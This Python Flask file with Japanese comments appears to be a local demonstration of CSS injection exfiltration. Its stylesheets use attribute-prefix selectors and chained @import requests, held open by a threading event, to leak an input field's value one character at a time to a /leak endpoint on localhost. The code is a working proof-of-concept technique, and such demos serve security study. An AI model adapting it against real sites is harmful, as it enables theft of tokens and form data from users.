import threading

from flask import Flask, Response

app = Flask(__name__)

# leakエンドポイントにアクセスがあったらフラグを立てる
leak_event = threading.Event()
port = 8888


@app.route("/")
def index():
    return """
    <h1>CSS Injection Demo</h1>
    <p>以下のリンクをクリックすると /1.css を取得しようとしますが、
       /leak/<value> へのアクセスがあるまでレスポンスが保留されます。</p>
    <p><a href="/test">/test へアクセス</a></p>
    """


@app.route("/test")
def test_page():
    html = """
    <html>
    <head>
      <link rel="stylesheet" href="/1.css">
    </head>
    <body>
      <input type="text" value="abc">
      <h2>Check Network tab for /1.css request</h2>
    </body>
    </html>
    """
    return Response(html, mimetype="text/html")


@app.route("/1.css")
def first_css():
    css_rules = f"""
@import url("http://localhost:{port}/dynamic.css");

input[value^='a'] {{
  background: url(http://localhost:{port}/leak/a);
}}
    """
    return Response(css_rules, mimetype="text/css")


@app.route("/dynamic.css")
def dynamic_css():
    leak_event.wait()
    leak_event.clear()

    css = f"""
@import url("http://localhost:{port}/final_step.css");

input[value^='ab'] {{
    background: url(http://localhost:{port}/leak/ab);
}}
"""
    return Response(css, mimetype="text/css")


@app.route("/final_step.css")
def final_step_css():
    leak_event.wait()
    leak_event.clear()

    return Response("/* final step of CSS injection */", mimetype="text/css")


@app.route("/leak/<value>")
def leak_value(value):
    leak_event.set()
    return f"Leaked value: {value}"


app.run(host="0.0.0.0", port=port)
